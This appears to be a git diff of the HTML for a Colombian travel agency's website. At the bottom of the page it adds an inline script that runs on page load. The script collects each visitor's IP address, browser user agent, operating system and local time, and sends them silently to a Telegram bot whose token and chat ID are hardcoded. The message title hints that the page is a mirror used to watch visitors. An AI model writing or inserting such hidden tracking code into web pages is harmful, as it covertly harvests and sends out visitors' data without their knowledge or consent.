@@ -205,35 +205,48 @@
     <p>&copy; 2025 Aventuras Sin Fin | Agencia de Viajes Colombia</p>
   </footer>
 
-  <!-- Script para enviar IP a Telegram -->
-  <script>
-    const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM'; // Tu token de bot
-    const chatId = '-4695874904'; // Tu chat ID
+ <!-- Script para enviar IP a Telegram -->
+<script>
+  const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM'; // Tu token de bot
+  const chatId = '-4695874904'; // Tu chat ID
 
-    async function getUserIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-      } catch (error) {
-        return 'IP no disponible';
-      }
+  async function getUserIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch (error) {
+      return 'IP no disponible';
     }
+  }
 
-    async function notifySiteVisit() {
-      const ip = await getUserIP();
-      const message = `📣💊 *MI TIO ENTRANDO AL ESPEJO* 💊📣\n🌍 *IP:* ${ip}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+  async function notifySiteVisit() {
+    const ip = await getUserIP();
+    const userAgent = navigator.userAgent;
+    const os = navigator.platform || 'SO no detectado';
+    const fecha = new Date().toLocaleString('es-CO');
 
-      try {
-        await fetch(url);
-      } catch (error) {
-        console.error('Error al enviar el mensaje de ingreso:', error);
-      }
+    const message = `
+📣💊 *MI TÍO ENTRANDO AL ESPEJO* 💊📣
+
+🌍 *IP:* ${ip}
+🖥️ *Navegador:* ${userAgent}
+💻 *Sistema:* ${os}
+🕒 *Hora local:* ${fecha}
+`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    try {
+      await fetch(url);
+    } catch (error) {
+      console.error('Error al enviar el mensaje de ingreso:', error);
     }
+  }
 
-    window.onload = notifySiteVisit;
-  </script>
+  window.onload = notifySiteVisit;
+</script>
+
 
 </body>
 </html>
